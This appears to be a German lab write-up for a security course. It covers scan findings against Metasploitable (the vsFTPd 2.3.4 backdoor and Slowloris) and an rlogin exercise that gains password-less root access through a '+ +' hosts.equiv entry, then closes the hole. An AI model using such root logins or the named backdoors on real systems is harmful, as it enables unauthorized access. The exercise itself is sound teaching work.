#### Analyse der Scan-Ergebnisse

##### FTP – Port 21/tcp

Auf Port 21 wurde ein FTP-Dienst identifiziert.
Das Nmap-Skript ftp-vsftpd-backdoor meldet eine kritische Schwachstelle in der eingesetzten FTP-Software

- **Betroffene Software:** vsFTPd Version 2.3.4
- **CVE:** CVE-2011-2523
- **Schwachstellentyp:** Backdoor / Remote Code Execution
- **Status:** VULNERABLE (exploitable)


##### HTTP – Port 80/tcp

Auf Port 80 wurde ein HTTP-Webserver erkannt.  
Das Skript `http-slowloris-check` weist auf eine mögliche Anfälligkeit für einen **Denial-of-Service-Angriff** hin.

- **CVE:** CVE-2007-6750
- **Schwachstellentyp:** Slowloris DoS
- **Status:** LIKELY VULNERABLE

Ein Slowloris-Angriff kann dazu führen, dass der Webserver durch viele gleichzeitig offen gehaltene Verbindungen blockiert wird und legitime Anfragen nicht mehr verarbeitet.

# 5 Übung (rlogin vulnerability)

### Aufgabenstellung

Informiere dich über rlogin und mögliche Angriffe/Fehlkonfiguration in diesem Zusammenhang.

* Prüfe mit nmap ob der rlogin zugeordnete Port bei Metasploitable offen ist.
* Nutze diese Sicherheitslücke aus um dich als root mit rlogin einzuloggen.
* Welche Fehlkonfiguration ermöglicht diesen exploit?
* Ändere die Konfiguration von Metasploitable ab um die Sicherheitslücke zu schließen. rlogin soll noch funktionieren    aber immer nach user und passwort fragen. Teste mit dem User msfadmin.

### Lösung 

#### 1. Was ist rlogin?

rlogin ist ein veralteter Remote-Login-Dienst, der unverschlüsselt arbeitet und auf vertrauensbasierter Authentifizierung über Dateien wie `/etc/hosts.equiv` und `~/.rhosts beruht`.
Durch diese Fehlkonfigurationen sind Logins ohne Passwort möglich, im schlimmsten Fall sogar ein Root-Login ohne Authentifizierung.

#### 2. Prüfen ob rlogin-Port offen ist (Metasploitable)

```bash
nmap -Pn -p 513 192.168.7.51
```

**Ergebnis:** <br>
513/tcp open  login
--> rlogin ist aktiv und erreichbar

#### 3. Ausnutzen der Sicherheitslücke (Root-Login)

```bash
rlogin -l root 192.168.7.51
```

**Ergebnis:** <br>
```bash
┌──(kali㉿kali)-[~]
└─$ rlogin -l root 192.168.7.51
Last login: Mon Nov 24 06:46:22 EST 2025 from :0.0 on pts/0

The programs included with the Ubuntu system are free software;

applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@metasploitable:~# 
```
Root-Zugriff ohne Authentifizierung

#### 4. Welche Fehlkonfiguration ermöglicht den Exploit?

```bash
root@metasploitable:~# cat /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#                   command access to your system .
+ +
```

Datei /etc/hosts.equiv erlaubt vertrauenswürdige Hosts. Zusätzlich ist Root-Login via rlogin erlaubt und keine Passwortabfrage aktiviert. 

Der Inhalt „+“ bedeutet, dass allen Hosts und allen Benutzern vertraut wird.

#### 5 Sicherheitslücke schließen (rlogin soll weiter funktionieren)

* Schritt 1: Auf Metasploitable anmelden (als root)
* Schritt 2: Unsichere Vertrauensdateien entfernen / leeren
    - rm -f /etc/hosts.equiv
    - rm -f /root/.rhosts
* Schritt 3: Root-Login über rlogin deaktivieren
    - Datei /etc/pam.d/rlogin bearbeiten und Sicherstellen, dass auth required pam_securetty.so aktiv ist
* Schritt 4: rlogin neu starten
* Schritt 5: Test: rlogin mit msfadmin

```bash
metasploitable login: msfadmin
Password: 
```

➡️ Login nur mit Passwort möglich
➡️ Sicherheitslücke geschlossen
➡️ rlogin funktioniert weiterhin
